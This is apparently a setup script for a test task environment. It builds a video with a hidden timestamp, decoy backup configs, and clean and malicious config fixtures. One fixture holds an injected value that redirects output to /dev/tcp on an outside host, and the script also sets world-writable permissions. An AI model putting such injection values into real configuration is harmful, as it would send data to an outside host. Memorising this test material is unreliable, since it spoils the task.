#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg fonts-dejavu-core binutils tar
    pip3 install pytest

    mkdir -p /app

    # Generate the video trace
    ffmpeg -f lavfi -i color=c=black:s=640x480:d=10 \
        -vf "drawtext=fontfile=/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf:text='TIMESTAMP=2024-05-12_08-30-15':fontcolor=white:fontsize=24:x=(w-text_w)/2:y=(h-text_h)/2:enable='between(t,4,5)'" \
        -c:v libx264 -y /app/rotation_trace.mp4

    # Create backups
    mkdir -p /tmp/backups
    echo "valid base config" > /tmp/backups/config_2024-05-12_08-30-15.conf
    echo "decoy config 1" > /tmp/backups/config_2024-05-12_08-30-10.conf
    echo "decoy config 2" > /tmp/backups/config_2024-05-12_08-30-20.conf
    tar -czf /app/backups.tar.gz -C /tmp backups
    rm -rf /tmp/backups

    # Create clean configs
    mkdir -p /app/clean_configs
    for i in $(seq 1 10); do
        cat <<EOF > /app/clean_configs/clean_$i.conf
log_path=/var/log/app_$i.log
config_dir=/etc/app/conf.d
EOF
    done

    # Create evil configs
    mkdir -p /app/evil_configs
    for i in $(seq 1 10); do
        if [ $((i % 3)) -eq 0 ]; then
            # Stream redirection injection
            echo "log_path=/var/log/app.log > /dev/tcp/10.0.0.1/8080" > /app/evil_configs/evil_$i.conf
        elif [ $((i % 3)) -eq 1 ]; then
            # Outside standard paths
            echo "log_path=/tmp/hacked.log" > /app/evil_configs/evil_$i.conf
        else
            # Oversized file
            dd if=/dev/zero of=/app/evil_configs/evil_$i.conf bs=1M count=2 2>/dev/null
            echo "log_path=/var/log/app.log" >> /app/evil_configs/evil_$i.conf
        fi
    done

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
